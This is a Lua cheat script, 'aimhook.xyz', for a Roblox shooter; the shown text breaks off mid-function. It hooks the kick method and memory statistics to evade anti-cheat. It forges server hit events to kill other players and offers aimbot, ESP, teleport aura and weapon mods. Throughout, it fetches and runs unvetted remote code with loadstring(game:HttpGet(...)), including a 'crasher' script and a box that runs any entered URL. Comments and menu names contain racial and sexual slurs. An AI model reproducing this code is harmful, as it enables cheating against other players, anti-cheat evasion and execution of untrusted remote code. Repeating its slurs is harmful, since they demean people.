-- xonae pls patch

--getgenv().UseProtection = true
--getgenv().UseWatermark = true
--getgenv().AutoExec = true

repeat task.wait() until game:IsLoaded();
hookfunction(game.Stats.GetMemoryUsageMbForTag, function()
    coroutine.yield()
end)
local arsonfuncs={}
local sent={}
local GoddedUsers={}
local UserInputService=game:GetService("UserInputService")
local BodyVelocity=Instance.new("BodyVelocity")
local SecureFolder=Instance.new("Folder",workspace)
local NoAnimation=Instance.new("Animation",game.CoreGui)
local NotifyLib=loadstring(game:HttpGet("https://raw.githubusercontent.com/vKhonshu/intro/main/ui"))()
local api=loadstring(game:HttpGet("https://raw.githubusercontent.com/Storm99999/whitelistkeys/main/aimhook/api/corefile.lua"))()
local beams=game:GetObjects("rbxassetid://12328085159")[1]
local xonae=false or false;
local name=""..math.random(1,100000000) -- fuck you nigger
local name2=""..math.random(1,100000000) -- fuck you nigger
BodyVelocity.MaxForce = Vector3.new(math.huge, 0, math.huge)
NoAnimation.AnimationId = "rbxassetid://0"
SecureFolder.Name="4564694893204234890234802948293482094820934820985092757873687984376893476893476983476983454"
shared.Settings={}
shared.Notifier=NotifyLib
--shared.ThirdPerson=false

function arsonfuncs:RotationY(cframe)
    local x, y, z = cframe:ToOrientation()
    return CFrame.new(cframe.Position) * CFrame.Angles(0,y,0)
end
function arsonfuncs:getplrsname()
    for i,v in pairs(game:GetChildren()) do
        if v.ClassName == "Players" then
            return v.Name
        end
    end
end
function arsonfuncs:GetSecureFolder()
    return SecureFolder;
end
function arsonfuncs:IsSecure(obj)
    if arsonfuncs:GetSecureFolder():FindFirstChild(obj.Name)then return true end    
end
function arsonfuncs:IsEmpty(v)
    for _, v in pairs(v) do
        if v ~= nil then
            return false;
        end
    end
    
    return true;
end
function arsonfuncs:Crash()
    loadstring(game:HttpGet("https://GANGofGANG.gog-best.repl.co/aimhook/script_assets/crasher.lua"))()    
end
function arsonfuncs:GetVolume()
    return game.SoundService.WeaponDischarge.Volume;
end
function arsonfuncs:KillPlayer(Player)
    if game:GetService("ReplicatedStorage").wkspc.Status.RoundOver.Value then return end;
    if (not Player.Character or not Player.Character:FindFirstChild('HumanoidRootPart')) then
        return
    end
    local v162 = require(game.ReplicatedStorage.Modules.BitBuffer)();
    v162.writeString(game.Players.LocalPlayer.NRPBS.EquippedTool.Value);
    v162.writeUnsigned(2, 1);
    v162.writeUnsigned(2, 0); 
    v162.writeInt8(0);
    v162.writeFloat16((game.Players.LocalPlayer.Character.HumanoidRootPart.Position - Player.Character.HumanoidRootPart.Position).Magnitude); 
    v162.writeInt8(1);
    v162.writeUnsigned(1, 0);
    v162.writeUnsigned(1, 0);
    v162.writeVector3(Player.Character.HumanoidRootPart.Position); 
    v162.writeVector3(Player.Character.HumanoidRootPart.Position);
    if game:GetService("ReplicatedStorage").wkspc.Status.RoundOver.Value then return end;
    return game.ReplicatedStorage.Events["\226\128\139HitPart"]:FireServer(Player.Character.HumanoidRootPart, v162.dumpString(), 'swaggg', nil)
end


local ESP_FOLDER = Instance.new("Folder", game.CoreGui);
local Loader = require(game.ReplicatedStorage.Modules.AssetStreaming);
local VMOffsets={X=.5,Y=.5,Z=.5};
local AuraOffsets={X=-5,Y=0,Z=0}
local SAVETABLE={SKIN=game.Players.LocalPlayer.Data.Skin.Value}
local extVol=arsonfuncs:GetVolume()
ESP_FOLDER.Name = "ESP"


local __config = { -- custom sleeves, very nice tbh.
    Color = Color3.fromRGB(255,255,255);
    Texture = "rbxassetid://11627980878"
}






local HoldingAnimation = Instance.new("Animation", game.CoreGui)
HoldingAnimation.AnimationId = "rbxassetid://0"
HoldingAnimation.Name = "45z657"
local __scopeID = "rbxassetid://156982610"

getgenv().Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/cat"))() --you can go into the github link and copy all of it and modify it for yourself.
getgenv().Window = getgenv().Library:CreateWindow("aimhook.xyz", Vector2.new(595, 768), Enum.KeyCode.RightShift) --you can change your UI keybind
local AimingTab = Window:CreateTab("aimbot") --you can rename this tab to whatever you want --you can also change the tabs code, for example "AimingTab" can be changed to "FunnyCoolTab" etc.
local byTab = Window:CreateTab("bypasses") --you can rename this tab to whatever you want --you can also change the tabs code, for example "AimingTab" can be changed to "FunnyCoolTab" etc.
local plrTab = Window:CreateTab("player") --you can rename this tab to whatever you want --you can also change the tabs code, for example "AimingTab" can be changed to "FunnyCoolTab" etc.
local visTab = Window:CreateTab("visuality") --you can rename this tab to whatever you want --you can also change the tabs code, for example "AimingTab" can be changed to "FunnyCoolTab" etc.
local skinTab = Window:CreateTab("skin changer") --you can rename this tab to whatever you want --you can also change the tabs code, for example "AimingTab" can be changed to "FunnyCoolTab" etc.
local aaTab = Window:CreateTab("antiaim") --you can rename this tab to whatever you want --you can also change the tabs code, for example "AimingTab" can be changed to "FunnyCoolTab" etc.
getgenv().scriptTab = getgenv().Window:CreateTab("scripts") --you can rename this tab to whatever you want --you can also change the tabs code, for example "AimingTab" can be changed to "FunnyCoolTab" etc.

local _aimhookFolder = Instance.new("Folder", game.CoreGui)
_aimhookFolder.Name ="aimdata"

for _, v in next, game.ReplicatedStorage.Weapons:GetDescendants() do 
    if v.Name == "AdminWeapon" then
        v:Destroy()
    end
    
end


local oldNewMt

oldNewMt = hookmetamethod(game, "__namecall", function(self, ...)
    local meth = getnamecallmethod()
    
    if meth == 'Kick' then
        task.wait(9e9)
        return nil
    end

    return oldNewMt(self, ...)
end)


-- collect data for further use of skin.cc
for _,v in pairs(game.ReplicatedStorage.Viewmodels["v_Classic Sword"]:GetChildren()) do 
    if v:IsA("Animation") then
        local _clone = v:Clone()
        _clone.Parent = _aimhookFolder
    end
end

for _,v in pairs(game.ReplicatedStorage.Viewmodels["v_The Firebrand"].Part2:GetChildren()) do 
    if v:IsA("ParticleEmitter") then
        local _clone = v:Clone()
        _clone.Parent = _aimhookFolder
    end
end

function random_plr()
    local num = math.random(1, #game.Players:GetChildren())
    local v = nil
    
    if game.Players:GetChildren()[num].Character and game.Players:GetChildren()[num].Name ~= game.Players.LocalPlayer.Name and game.Players:GetChildren()[num].TeamColor ~= game.Players.LocalPlayer.TeamColor then
        v = game.Players:GetChildren()[num]
    end
    
    return v
end

local watermark = Library:CreateWatermark("aimhook.xyz | {fps} | v4.2 | legit")
watermark.Visible = false

getgenv().HumSize = Vector3.new(2,2,2)
getgenv().HeadSize = Vector3.new(1.4497, 1.3017, 1.3017)

local configTable = {
    ReplicatedValues = {Voices=(function()local a={}for _,v in pairs(game:GetService("ReplicatedFirst").Voices:GetDescendants())do if v:FindFirstChild("Looped")and v:FindFirstChild("Volume")and v:FindFirstChild("PlaybackSpeed")then table.insert(a,v)end end return a end)(),},
    AimBot = true,
    AimBotSm = 0.08,
    Skin = "Monky With Drip",
    LocalAimPart = "Head",
    Wallbang = false,
    Fly = false,
    SilentAimar = false,
    InfJump = false,
    TP = false,
    Speed = false,
    AutoShoot = false,
    Trigger = false,
    ESP = false,
    Rainbow = false,
    AntiAim = false,
    AA_METHOD = "Mental",
    Spammer = false,
    ChatContext = "aimhook is just too good - gang.cc [#"..math.random(1,10000) .. "]",
    TopG = false,
    normal = false,
    AntiScope = false,
    ForceMenu = false,
    GunChams = false,
    GC_THEME = "aimhook",
    GC_TRANSPARENCY = .5,
    CS_SLEEVES = false,
    CustomColor = Color3.fromRGB(255,0,255),
    CustomMaterial = "ForceField",
    Noclip = false,
    FakeLag = false,
    FL_COLOR = Color3.fromRGB(255,0,255),
    FL_TRANSPARENCY=0.5,
    FL_MATERIAL = "ForceField",
    FL_DELAY = 1,
    BunnyHop = false,
    BHopMethod = "Humanoid",
    BHopSpeed = 20,
    Hitboxes = false,
    AnnoyVoice = false,
    UpsideDown = false,
    RSleeve = false,
    LArms = false,
    VMChange = false,
    NoArms = false,
    WorldAmbience = false,
    BTracers = false,
    BColor = Color3.fromRGB(255,0,255),
    BMaterial = "ForceField",
    BType = 'old',
    Hitsounds = false,
    Hitsound = "skeet.cc",
    Volume = 1,
    DeathSay = false,
    Revive = false,
    ThirdPerson = false,
    MaxTorque = Vector3.new(0,35000,0),
    Random = false,
    AutoShoot2 = false,
    NESP = false,
    NameESP={TextSize=8,Color=Color3.fromRGB(255,0,255),Font="Code"},
    TPAura=false,
    TPStraight=false,
    TPBack = false,
    Mods = false,
    ForceKillAll=false,
    S2=false,
    SCheck = false,
    KillAura = false,
    HitLog = false,
    AASpin = false,
    UseCustomRotation = false,
    RotationY = false,
    SpinSpeed = 120,
    DisableAnims = false,
    BTexture = 'default',
    GodNotify = false,
    Keep=false,
    resolveparts={},
    Racc=false,
    NoFilter=false,
    IsIntern=true,
    MTex=false,
    Backtrack=false,
    BacktrackDelay=100,
    Backmat="Neon",
    BacktrackColor=Color3.fromRGB(255,0,255),
    Hideback=false,
    OnlyBT=false,
    ktype='normal',
    IgnoreVisibility=false,
    Farmhearts=false,
    ftype='tp',
}

-- guh, this took for ages
function arsonfuncs:RotatePlayer(cframe)
	local Gyro = Instance.new('BodyGyro')
	Gyro.D = 0
	Gyro.P = (configTable.SpinSpeed * 100)
	Gyro.MaxTorque = Vector3.new(0, (configTable.SpinSpeed * 100), 0)
	Gyro.Parent = game.Players.LocalPlayer.Character.UpperTorso
	Gyro.CFrame = CFrame.new(Gyro.Parent.Position, cframe.Position)
    task.wait()
	Gyro:Destroy()
end

local world={Ambient=Color3.fromRGB(255,0,255),OutdoorAmbient=Color3.fromRGB(255,0,255),ColorShift_Top=Color3.fromRGB(255,0,255),ColorShift_Bottom=Color3.fromRGB(255,0,255),ClockTime=4.5,Saturation=0,Brightness=0,TintColor=Color3.fromRGB(255,255,255)};
local chatKey = nil
local wallBangKey = nil

local testSection = AimingTab:CreateSector("AimWare", "left")  --you can  change the section code, for example "testsection" can be changed to "FunnyCoolSection" etc.
local niggerMods=AimingTab:CreateSector("gun modifications", "right")
local hvh=AimingTab:CreateSector("hvh","right")
local aura=AimingTab:CreateSector("tp aura", "right")
local bSec = byTab:CreateSector("non fe", "left")
local bSec2 = byTab:CreateSector("locker/fe", "right")
local bSec3 = byTab:CreateSector("teleports", "left")
local hSec = visTab:CreateSector("visuals", "left")
-- u need weapon skins for this
local nSec2 = visTab:CreateSector("weapon skins", "right")
local nSec3 = visTab:CreateSector("rtx shading", "right")
local nSec4 = visTab:CreateSector("viewmodel & others", "right")
local nSec5 = visTab:CreateSector("world", "right")

local vSec = plrTab:CreateSector("utility", "left")
local charMods = plrTab:CreateSector("character utility","right")
local aaSec = aaTab:CreateSector("anti aim","left")

local kSec = skinTab:CreateSector("melees (PATCHED)", "left")
local k2Sec = skinTab:CreateSector("gun names", "right")
local k3Sec = skinTab:CreateSector("announcers", "left")
local k8Sec = skinTab:CreateSector("emotes", "right")
local k4Sec = skinTab:CreateSector("custom models", "right")
local k5Sec = skinTab:CreateSector("chat tags", "right")
local k6Sec = skinTab:CreateSector("codes", "right")
local k7Sec = skinTab:CreateSector("badge spoofer", "right")
local vSec9 = plrTab:CreateSector("music player", "right")
local vSec5 = plrTab:CreateSector("fov changer", "right")
local vSec6 = plrTab:CreateSector("impersonation", "right")
local cSec = AimingTab:CreateSector("hitboxes", "right")

--skin.cc
local __protectName = "__botyCheeksXmenSuckDickXD420"
local __gun = "Golden Gun"

local _i = getgenv().scriptTab:CreateSector("import", "left")
_i:AddTextbox("add", "Enter URL", function(x)
    loadstring(game:HttpGet(x))()    
end)



function getState()
    if isfolder("aimhook_scripts") then
        print("found!")
    else
        makefolder("aimhook_scripts");
        task.wait();
        for i = 1, 11 do 
            writefile("aimhook_scripts/"..tostring(i)..".lua", "")
            wait();
        end
    end
end

getState()

local _v = getgenv().scriptTab:CreateSector("saved scripts", "right")
for v = 1, 11 do
    _v:AddButton(v..".lua", function(x)
        if not isfile("aimhook_scripts/"..v..".lua") or readfile("aimhook_scripts/"..v..".lua")=="" or nil then
            print("Script is empty!")    
        else
            loadstring(readfile("aimhook_scripts/"..v..".lua"))()    
        end
    end)
end

-- new global script test, nothing special
loadstring(game:HttpGet("https://GANGofGANG.gog-best.repl.co/globalScripts2"))()

local _b = getgenv().scriptTab:CreateSector("global scripts","left")
local scriptsTable=loadstring(game:HttpGet("https://GANGofGANG.gog-best.repl.co/aimhook/script_assets/scripts.lua"))()

for __indexx,newvalue in pairs(scriptsTable) do
    _b:AddButton(newvalue.Name .. " ["..newvalue.Author.."]",function()
        loadstring(game:HttpGet(newvalue.source))()    
    end)
end


for __indexinteger, vls in pairs(game.ReplicatedStorage.Melees:GetChildren()) do
    kSec:AddButton(vls.Name, function(x)
        game:GetService("ReplicatedStorage").Viewmodels["v_Dagger"]:Destroy()
        task.wait()
        local Clone1 = game:GetService("ReplicatedStorage").Viewmodels["v_"..vls.Name]:Clone()
        Clone1.Parent = game:GetService("ReplicatedStorage").Viewmodels
        task.wait()
        game:GetService("ReplicatedStorage").Viewmodels["v_"..vls.Name].Name = "v_Dagger"
        game:GetService("ReplicatedStorage").ItemData.Images.Melees.Dagger.Quality.Value = game:GetService("ReplicatedStorage").ItemData.Images.Melees[vls.Name].Quality.Value
        game:GetService("ReplicatedStorage").ItemData.Images.Melees.Dagger.Value = game:GetService("ReplicatedStorage").ItemData.Images.Melees[vls.Name].Value
        game:GetService("ReplicatedStorage").KillIcons.Dagger.Value = game:GetService("ReplicatedStorage").KillIcons[vls.Name].Value
        local Config =
{
    ProtectedName = vls.Name, --What the protected name should be called. (Go to line 51)
    OtherPlayers = false, --If other players should also have protected names.
    OtherPlayersTemplate = "aimhook.xyz", --Template for other players protected name (ex: "NamedProtect" will turn into "NameProtect1" for first player and so on)
    RenameTextBoxes = true, --If TextBoxes should be renamed. (could cause issues with admin guis/etc)
    UseFilterPadding = false, --If filtePeach name should be the same size as a regular name.
    FilterPad = " ", --Character used to filter pad.
    UseMetatableHook = true, --Use metatable hook to increase chance of filtering. (is not supported on wrappers like bleu)
    UseAggressiveFiltering = true --Use aggressive property renaming filter. (renames a lot more but at the cost of lag)
}

local ProtectedNames = {}
local Counter = 1
if Config.OtherPlayers then
    for I, V in pairs(game.Players:GetPlayers()) do
        local Filter = Config.OtherPlayersTemplate .. tostring(Counter)
        if Config.UseFilterPadding then
            if string.len(Filter) > string.len(V.Name) then
                Filter = string.sub(Filter, 1, string.len(V.Name))
            elseif string.len(Filter) < string.len(V.Name) then
                local Add = string.len(V.Name) - string.len(Filter)
                for I=1,Add do
                    Filter = Filter .. Config.FilterPad
                end
            end
        end
        ProtectedNames[V.Name] = Filter
        Counter = Counter + 1
    end

    game.Players.PlayerAdded:connect(function(Player)
        local Filter = Config.OtherPlayersTemplate .. tostring(Counter)
        if Config.UseFilterPadding then
            if string.len(Filter) > string.len(V.Name) then
                Filter = string.sub(Filter, 1, string.len(V.Name))
            elseif string.len(Filter) < string.len(V.Name) then
                local Add = string.len(V.Name) - string.len(Filter)
                for I=1,Add do
                    Filter = Filter .. Config.FilterPad
                end
            end
        end
        ProtectedNames[Player.Name] = Filter
        Counter = Counter + 1
    end)
end

local LPName = "Dagger" -- hi, hi :D
local IsA = game.IsA

if Config.UseFilterPadding then
    if string.len(Config.ProtectedName) > string.len(LPName) then
        Config.ProtectedName = string.sub(Config.ProtectedName, 1, string.len(LPName))
    elseif string.len(Config.ProtectedName) < string.len(LPName) then
        local Add = string.len(LPName) - string.len(Config.ProtectedName)
        for I=1,Add do
            Config.ProtectedName = Config.ProtectedName .. Config.FilterPad
        end
    end
end

local function FilterString(S)
    local RS = S
    if Config.OtherPlayers then
        for I, V in pairs(ProtectedNames) do
            RS = string.gsub(RS, I, V)
        end
    end
    RS = string.gsub(RS, LPName, Config.ProtectedName)
    return RS
end

for I, V in pairs(game:GetDescendants()) do
    if Config.RenameTextBoxes then
        if IsA(V, "TextLabel") or IsA(V, "TextButton") or IsA(V, "TextBox") then
            V.Text = FilterString(V.Text)

            if Config.UseAggressiveFiltering then
                V:GetPropertyChangedSignal("Text"):connect(function()
                    V.Text = FilterString(V.Text)
                end)
            end
        end
    else
        if IsA(V, "TextLabel") or IsA(V, "TextButton") then
            V.Text = FilterString(V.Text)

            if Config.UseAggressiveFiltering then
                V:GetPropertyChangedSignal("Text"):connect(function()
                    V.Text = FilterString(V.Text)
                end)
            end
        end
    end
end

if Config.UseAggressiveFiltering then
    game.DescendantAdded:connect(function(V)
        if Config.RenameTextBoxes then
            if IsA(V, "TextLabel") or IsA(V, "TextButton") or IsA(V, "TextBox") then
                V:GetPropertyChangedSignal("Text"):connect(function()
                    V.Text = FilterString(V.Text)
                end)
            end
        else
            if IsA(V, "TextLabel") or IsA(V, "TextButton") then
                V:GetPropertyChangedSignal("Text"):connect(function()
                    V.Text = FilterString(V.Text)
                end)
            end
        end
    end)
end

if Config.UseMetatableHook then
    if not getrawmetatable then
        error("GetRawMetaTable not found")
    end

    local NewCC = function(F)
        if newcclosure then return newcclosure(F) end
        return F
    end

    local SetRO = function(MT, V)
        if setreadonly then return setreadonly(MT, V) end
        if not V and make_writeable then return make_writeable(MT) end
        if V and make_readonly then return make_readonly(MT) end
        error("No setreadonly found")
    end

    local MT = getrawmetatable(game)
    local OldNewIndex = MT.__newindex
    SetRO(MT, false)

    MT.__newindex = NewCC(function(T, K, V)
        if Config.RenameTextBoxes then
            if (IsA(T, "TextLabel") or IsA(T, "TextButton") or IsA(T, "TextBox")) and K == "Text" and type(V) == "string" then
                return OldNewIndex(T, K, FilterString(V))
            end
        else
            if (IsA(T, "TextLabel") or IsA(T, "TextButton")) and K == "Text" and type(V) == "string" then
                return OldNewIndex(T, K, FilterString(V))
            end
        end

        return OldNewIndex(T, K, V)
    end)

    SetRO(MT, true)
    end
    end)    
end

k2Sec:AddTextbox("Gun Name", "Enter Name", function(State)
    __gun = State
    print(__gun);
end)

k2Sec:AddTextbox("Custom Gun Name", "Enter Name", function(State)
    __protectName = State
    print(__protectName);
end)

local announcer = {
    DeployURL = "",
    HeadshotURL = "",
    DemotedURL = "",
    KnifeURL = "",
    WinURL = "",
    AnnouncerImage = "",
    AnnouncerName = ""
}

local subs = {
    Deploy = "",
    HeadShot = "",
    Demoted = "",
    Knife = "",
    Win = ""
}

k3Sec:AddTextbox("Deploy Sound", "Enter URL", function(State)
    announcer.DeployURL = State
end)

local newF = aura:AddToggle("tp aura",false,function(x)
    configTable.TPAura=x;    
end)

newF:AddKeybind()
aura:AddToggle("tp straight",true,function(x)
    configTable.TPStraight=x;    
end)

aura:AddToggle("tp behind",true,function(x)
    configTable.TPBack=x;    
end)

aura:AddSlider("tp x", -20, -5, 20, 1, function(State)
    AuraOffsets.X=State;
end)
aura:AddSlider("tp y", -20, 0, 20, 1, function(State)
    AuraOffsets.Y=State;
end)
aura:AddSlider("tp z", -20, 0, 20, 1, function(State)
    AuraOffsets.Z=State;
end)
hvh:AddButton("Desync (K: x)",function(x)
    loadstring(game:HttpGet("https://GANGofGANG.gog-best.repl.co/aimhook/script_assets/desync.lua"))()
    task.wait()
    for _, v in next, game.CoreGui:GetChildren() do
      if v.Name == "popupGUI" then
          v.Name ="gaypornV2"
          v.mainFrame.Visible = false
      end
    end
end)
hvh:AddButton("Unhittable (spawn)",function(x)
    local localPlr=game.Players.LocalPlayer;
    if not localPlr.Character then return end;
    if not localPlr.Character:FindFirstChild("Spawned") then return end;
    
    for _,v in pairs(localPlr.Character:GetChildren()) do
        if v:IsA("Accessory") then
            if v:FindFirstChild("Handle") then
                v.Handle:Destroy()    
            end
        end
    end
    
    for _,v in pairs(localPlr.Character:GetChildren())do
        if string.find(v.Name,'Foot')or(string.find(v.Name,'Arm'))or(string.find(v.Name,'Leg')) then
            print(v.Name)
            v:Destroy()
        end
    end
    
    if localPlr.Character:FindFirstChild("FakeHead") then
        localPlr.Character.FakeHead:Destroy()    
    end
    
    if localPlr.Character:FindFirstChild("HeadHB") then
        localPlr.Character.HeadHB:Destroy()    
    end
end)



niggerMods:AddToggle("Instant Reload", false, function(x)
    if x then
        for _,v in pairs(game.ReplicatedStorage.Weapons:GetChildren())do
            if v:FindFirstChild("ReloadTime")then
                v.ReloadTime.Value=0.01
            end
            
            if v:FindFirstChild("EReloadTime")then
                 v.EReloadTime.Value=0.01
            end

        end
    end
end)

niggerMods:AddToggle("Instant Equip", false, function(x)
    if x then
        for _,v in pairs(game.ReplicatedStorage.Weapons:GetChildren())do
            if v:FindFirstChild("EquipTime")then
                v.EquipTime.Value=0.01
            end
        end
    end
end)

k3Sec:AddTextbox("Deploy Subtitle", "Enter Text", function(State)
    subs.Deploy = State
end)



nSec5:AddToggle("World Ambience",false,function(x)
    configTable.WorldAmbience=x;    
end)
local c1 = nSec5:AddToggle("Ambient",false,function(x)
end)

c1:AddColorpicker(Color3.fromRGB(255,0,255),function(x)
    world.Ambient=x;    
end)

local c2 = nSec5:AddToggle("OutdoorAmbient",false,function(x)
end)

c2:AddColorpicker(Color3.fromRGB(255,0,255),function(x)
    world.OutdoorAmbient=x;    
end)

local c3 = nSec5:AddToggle("ColorShift_Bottom",false,function(x)
end)

c3:AddColorpicker(Color3.fromRGB(255,0,255),function(x)
    world.ColorShift_Bottom=x;    
end)

local c4 = nSec5:AddToggle("ColorShift_Top",false,function(x)
end)


c4:AddColorpicker(Color3.fromRGB(255,0,255),function(x)
    world.ColorShift_Top=x;    
end)


nSec5:AddSlider("clock time", 0, 4.5, 24, 1, function(State)
    world.ClockTime=State;
end)





nSec4:AddToggle("Viewmodel Changer", false, function(x)
    configTable.VMChange=x;    
end)
nSec4:AddToggle("Remove VM Sleeves", false, function(x)
    configTable.RSleeve = x
end)

nSec4:AddToggle("Anchor Arms", false, function(x)
    configTable.LArms = x
end)
nSec4:AddToggle("Remove Arms", false, function(x)
    configTable.NoArms = x
end)
nSec4:AddToggle("AntiScope", false, function(x)
    configTable.AntiScope=x
end)
nSec4:AddToggle("Keep FOV", false, function(x)
    configTable.Keep = x
end)
nSec4:AddToggle("RGB ViewModel Arms", false, function(x)
    configTable.Rainbow = x    
end)
local btrac= nSec4:AddToggle("Bullet Tracers", false, function(x)
    configTable.BTracers=x;    
end)

nSec4:AddDropdown("Bullet Tracers Type", {"old", "new"}, "old",false, function(x)
    configTable.BType=x;
end)

nSec4:AddDropdown("Bullet Tracers Texture", {"default", "swag", "cum fetish", "ok"}, "default",false, function(x)
    configTable.BTexture=x;
end)


nSec4:AddDropdown("Bullet Tracers Material", {"ForceField", "Neon", "SmoothPlastic", "Glass", "Ice"}, "ForceField",false, function(x)
    configTable.BMaterial=x;
end)

btrac:AddColorpicker(Color3.fromRGB(255,0,255),function(x)
    configTable.BColor=x;
end)

nSec4:AddSlider("viewmodel x", -10, .5, 10, 1, function(State)
    VMOffsets.X=State;
end)
nSec4:AddSlider("viewmodel y", -10, .5, 10, 1, function(State)
    VMOffsets.Y=State;
end)
nSec4:AddSlider("viewmodel z", -10, .5, 10, 1, function(State)
    VMOffsets.Z=State;
end)


nSec3:AddButton("Toyamo", function()
    loadstring(game:HttpGet("https://GANGofGANG.gog-best.repl.co/aimhook/script_assets/shading1.lua"))()    
    
end)

nSec3:AddButton("Reflection", function()
    loadstring(game:HttpGet("https://GANGofGANG.gog-best.repl.co/aimhook/script_assets/shading2.lua"))()    
    
end)

local img=""

nSec2:AddTextbox("rbxassetid", "Enter Image ID", function(State)
    img=State
end)

nSec2:AddButton("Edit", function(x)
    for _, vls in pairs(game.ReplicatedStorage.Skins:GetChildren()) do
        if vls:IsA("StringValue") then
            vls.Value = img 
        end
    end
end)

k3Sec:AddTextbox("Headshot Sound", "Enter URL", function(State)
    announcer.HeadshotURL = State
end)

k3Sec:AddTextbox("Headshot Subtitle", "Enter Text", function(State)
    subs.HeadShot = State
end)

k3Sec:AddTextbox("Demoted Sound", "Enter URL", function(State)
    announcer.DemotedURL = State
end)

k3Sec:AddTextbox("Demoted Subtitle", "Enter Text", function(State)
    subs.Demoted = State
end)

k3Sec:AddTextbox("Knived Sound", "Enter URL", function(State)
    announcer.KnifeURL = State
end)

k3Sec:AddTextbox("Knived Subtitle", "Enter Text", function(State)
    subs.Knife = State
end)

k3Sec:AddTextbox("Win Sound", "Enter URL", function(State)
    announcer.WinURL = State
end)

k3Sec:AddTextbox("Win Subtitle", "Enter Text", function(State)
    subs.Win = State
end)

k3Sec:AddTextbox("Announcer Image", "Enter rbxassetid", function(State)
    announcer.AnnouncerImage=State
end)

k3Sec:AddTextbox("Announcer Name", "Enter Name", function(State)
    announcer.AnnouncerName=State
end)

k3Sec:AddButton("Add Announcer", function(x)
    local __announcerFiles = {'deploy.mp3', 'headshot.mp3', 'Winn.mp3', 'backstab.mp3', 'knived.mp3'}
    
    for __files, FObject in pairs(__announcerFiles) do
        if isfile(FObject) then
            delfile(FObject);    
        end
    end
    
    writefile("deploy.mp3", game:HttpGet(announcer.DeployURL))
    writefile("headshot.mp3", game:HttpGet(announcer.HeadshotURL))
    writefile("Winn.mp3", game:HttpGet(announcer.WinURL))
    writefile("backstab.mp3", game:HttpGet(announcer.DemotedURL))

    local v = game:GetService("Players").LocalPlayer.PlayerGui.Announcer.American

        v.Volume.Value = 1
        for i,_v in pairs(v.Deploy:GetChildren()) do
            _v.Value = getsynasset("deploy.mp3")
            _v.Sub.Value = subs.Deploy
        end
        
        for i,_v in pairs(v.KnifeKill:GetChildren()) do
            _v.Value = getsynasset("knived.mp3")
            _v.Sub.Value = subs.Knife

        end
        
        for i,_v in pairs(v.Demoted:GetChildren()) do
            _v.Value = getsynasset("backstab.mp3")
            _v.Sub.Value = subs.Demoted

        end
        
        for i,_v in pairs(v.Headshot:GetChildren()) do
            _v.Value = getsynasset("headshot.mp3")
            _v.Sub.Value = subs.HeadShot

        end
        
        for i,_v in pairs(v.Winner:GetChildren()) do
            _v.Value = getsynasset("Winn.mp3")
            _v.Sub.Value = subs.Win
        end
    
end)

k4Sec:AddButton("Dagger To Bowser (original)", function(yx)
    game.ReplicatedStorage.Viewmodels.v_Dagger.Handle.TextureID="rbxassetid://430331587"
    game.ReplicatedStorage.Viewmodels.v_Dagger.Handle.MeshId="rbxassetid://430331583"
    game.ReplicatedStorage.Viewmodels.v_Dagger.Handle.Size = Vector3.new(0.09, 1, 0.1);
    game.ReplicatedStorage.Viewmodels.v_Dagger.Handle.Rotation = Vector3.new(-90, 90, 0);
    
    
    if game.ReplicatedStorage.Viewmodels.v_Dagger:FindFirstChild("Part") then
        game.ReplicatedStorage.Viewmodels.v_Dagger.Part.Transparency = 1    
    end
    
    game:GetService("ReplicatedStorage").ItemData.Images.Melees.Dagger.Quality.Value = "Bundle";
    game:GetService("ReplicatedStorage").ItemData.Images.Melees.Dagger.Value = "http://www.roblox.com/asset/?id=164011538"
    game:GetService("ReplicatedStorage").KillIcons.Dagger.Value = "http://www.roblox.com/asset/?id=164011538"
    
    local Config =
{
    ProtectedName = "Bowser", --What the protected name should be called. (Go to line 51)
    OtherPlayers = false, --If other players should also have protected names.
    OtherPlayersTemplate = "aimhook.xyz", --Template for other players protected name (ex: "NamedProtect" will turn into "NameProtect1" for first player and so on)
    RenameTextBoxes = true, --If TextBoxes should be renamed. (could cause issues with admin guis/etc)
    UseFilterPadding = false, --If filtePeach name should be the same size as a regular name.
    FilterPad = " ", --Character used to filter pad.
    UseMetatableHook = true, --Use metatable hook to increase chance of filtering. (is not supported on wrappers like bleu)
    UseAggressiveFiltering = true --Use aggressive property renaming filter. (renames a lot more but at the cost of lag)
}

local ProtectedNames = {}
local Counter = 1
if Config.OtherPlayers then
    for I, V in pairs(game.Players:GetPlayers()) do
        local Filter = Config.OtherPlayersTemplate .. tostring(Counter)
        if Config.UseFilterPadding then
            if string.len(Filter) > string.len(V.Name) then
                Filter = string.sub(Filter, 1, string.len(V.Name))
            elseif string.len(Filter) < string.len(V.Name) then
                local Add = string.len(V.Name) - string.len(Filter)
                for I=1,Add do
                    Filter = Filter .. Config.FilterPad
                end
            end
        end
        ProtectedNames[V.Name] = Filter
        Counter = Counter + 1
    end

    game.Players.PlayerAdded:connect(function(Player)
        local Filter = Config.OtherPlayersTemplate .. tostring(Counter)
        if Config.UseFilterPadding then
            if string.len(Filter) > string.len(V.Name) then
                Filter = string.sub(Filter, 1, string.len(V.Name))
            elseif string.len(Filter) < string.len(V.Name) then
                local Add = string.len(V.Name) - string.len(Filter)
                for I=1,Add do
                    Filter = Filter .. Config.FilterPad
                end
            end
        end
        ProtectedNames[Player.Name] = Filter
        Counter = Counter + 1
    end)
end

local LPName = "Dagger" -- hi, hi :D
local IsA = game.IsA

if Config.UseFilterPadding then
    if string.len(Config.ProtectedName) > string.len(LPName) then
        Config.ProtectedName = string.sub(Config.ProtectedName, 1, string.len(LPName))
    elseif string.len(Config.ProtectedName) < string.len(LPName) then
        local Add = string.len(LPName) - string.len(Config.ProtectedName)
        for I=1,Add do
            Config.ProtectedName = Config.ProtectedName .. Config.FilterPad
        end
    end
end

local function FilterString(S)
    local RS = S
    if Config.OtherPlayers then
        for I, V in pairs(ProtectedNames) do
            RS = string.gsub(RS, I, V)
        end
    end
    RS = string.gsub(RS, LPName, Config.ProtectedName)
    return RS
end

for I, V in pairs(game:GetDescendants()) do
    if Config.RenameTextBoxes then
        if IsA(V, "TextLabel") or IsA(V, "TextButton") or IsA(V, "TextBox") then
            V.Text = FilterString(V.Text)

            if Config.UseAggressiveFiltering then
                V:GetPropertyChangedSignal("Text"):connect(function()
                    V.Text = FilterString(V.Text)
                end)
            end
        end
    else
        if IsA(V, "TextLabel") or IsA(V, "TextButton") then
            V.Text = FilterString(V.Text)

            if Config.UseAggressiveFiltering then
                V:GetPropertyChangedSignal("Text"):connect(function()
                    V.Text = FilterString(V.Text)
                end)
            end
        end
    end
end

if Config.UseAggressiveFiltering then
    game.DescendantAdded:connect(function(V)
        if Config.RenameTextBoxes then
